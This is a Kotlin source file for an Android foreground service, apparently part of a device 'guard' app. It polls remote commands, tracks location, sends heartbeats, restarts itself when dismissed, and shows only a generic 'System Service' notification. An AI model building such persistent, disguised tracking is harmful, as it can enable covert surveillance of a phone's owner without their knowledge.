package com.myandroidguard.app.service

import android.app.*
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.myandroidguard.app.MainActivity
import kotlinx.coroutines.*

class GuardService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var commandPoller: CommandPoller
    private lateinit var locationTracker: LocationTracker

    companion object {
        private const val TAG = "GuardService"
        const val CHANNEL_ID = "guard_channel"
        const val NOTIFICATION_ID = 1001
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "GuardService onCreate")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            createNotificationChannel()
        }
        commandPoller = CommandPoller(this)
        locationTracker = LocationTracker(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "GuardService onStartCommand")
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, createNotification(),
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
            } else {
                startForeground(NOTIFICATION_ID, createNotification())
            }
            Log.d(TAG, "Foreground started successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Foreground service error: ${e.message}", e)
            try {
                startForeground(NOTIFICATION_ID, createNotification())
                Log.d(TAG, "Foreground started without type (fallback)")
            } catch (e2: Exception) {
                Log.e(TAG, "Foreground fallback also failed", e2)
            }
        }

        scope.launch {
            Log.d(TAG, "Starting command polling")
            commandPoller.startPolling()
        }
        scope.launch { locationTracker.startTracking() }
        scope.launch {
            while (isActive) {
                Log.d(TAG, "Sending heartbeat")
                commandPoller.sendHeartbeat()
                delay(30_000)
            }
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() { Log.d(TAG, "GuardService destroyed"); scope.cancel(); super.onDestroy() }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        try {
            val restartIntent = Intent(this, GuardService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restartIntent)
            } else {
                startService(restartIntent)
            }
        } catch (e: Exception) { Log.e(TAG, "Restart error", e) }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW)
            channel.description = "Background service"
            channel.setShowBadge(false)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val pi = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .setContentIntent(pi).setOngoing(true).setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_LOW).build()
    }
}